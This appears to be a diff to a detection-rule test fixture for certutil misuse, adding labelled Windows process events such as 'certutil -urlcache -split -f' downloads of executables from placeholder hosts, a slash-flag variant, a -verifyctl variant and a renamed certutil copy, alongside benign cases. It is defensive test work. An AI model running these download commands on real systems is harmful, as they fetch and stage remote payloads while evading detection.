@@ -1,5 +1,16 @@
 [
-  {"event":{"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache https://example.invalid/fixture"},"expected":true},
-  {"event":{"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache *"},"expected":false},
-  {"event":{"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -verify fixture.cer"},"expected":false}
+  {"note": "Classic download with -urlcache -split -f",
+   "event": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f https://dl.example.invalid/a.exe C:\\Users\\Public\\a.exe"}, "expected": true},
+  {"note": "Slash form of the flag",
+   "event": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil /urlcache /f http://203.0.113.10/p.bin p.bin"}, "expected": true},
+  {"note": "-verifyctl download variant",
+   "event": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -verifyctl -f -split https://dl.example.invalid/x.txt"}, "expected": true},
+  {"note": "Renamed certutil copy",
+   "event": {"Image": "C:\\Users\\Public\\cu.exe", "OriginalFileName": "CertUtil.exe", "CommandLine": "cu.exe -urlcache -f https://dl.example.invalid/a.exe a.exe"}, "expected": true},
+  {"note": "Listing the URL cache (no URL)",
+   "event": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache *"}, "expected": false},
+  {"note": "Certificate verification",
+   "event": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -verify fixture.cer"}, "expected": false},
+  {"note": "Hashing a file",
+   "event": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -hashfile C:\\Downloads\\setup.exe SHA256"}, "expected": false}
 ]
